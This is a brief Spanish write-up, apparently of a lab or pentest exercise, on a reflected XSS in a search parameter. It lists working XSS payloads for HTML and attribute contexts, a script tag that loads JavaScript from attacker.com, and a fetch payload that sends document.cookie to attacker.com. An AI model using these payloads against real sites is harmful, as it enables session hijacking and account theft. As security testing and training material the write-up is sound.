# Reflected XSS

Intercepté la búsqueda en Burp y el parámetro `q` se reflejaba sin encoding. Probé un payload básico:

    <img src=x onerror=alert(1)>

Funcionó en Chrome. Probé bypasses para ver el nivel de filtrado:

Payloads para testear contextos:

    </script><script>alert(1)</script>
    " onmouseover=alert(1) x="
    <svg/onload=alert(document.domain)>

El motor permitía ejecución en contexto HTML y atributo. El backend no aplicaba `Content-Security-Policy`, lo que habilita la carga de JS externo. Verifiqué:

    <script src="http://attacker.com/x.js"></script>

Posteriormente, validé impacto usando:

    <img src=x onerror="fetch('https://attacker.com/c?c='+document.cookie)">

El ejercicio demuestra capacidad para analizar contexto, fuzzear payloads, evaluar impacto real y comprender vectores de exfiltración vía XSS.
